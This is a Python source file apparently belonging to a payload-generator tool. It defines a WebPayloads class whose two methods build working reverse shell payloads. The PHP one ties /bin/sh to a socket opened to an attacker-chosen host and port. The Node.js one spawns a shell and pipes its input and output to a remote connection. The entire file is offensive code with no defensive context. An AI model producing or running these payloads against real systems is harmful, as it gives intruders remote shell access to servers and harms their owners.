#!/usr/bin/env python3
"""
Web Payload Modules
"""

class WebPayloads:
    def php_reverse_shell(self, lhost, lport, options=None):
        """PHP Reverse Shell"""
        if options is None:
            options = {}
        
        payload = f"""<?php
$sock=fsockopen("{lhost}",{lport});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""
        return payload
    
    def javascript_reverse_shell(self, lhost, lport, options=None):
        """JavaScript/Node.js Reverse Shell"""
        if options is None:
            options = {}
        
        payload = f"""
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({lport}, "{lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
"""
        return payload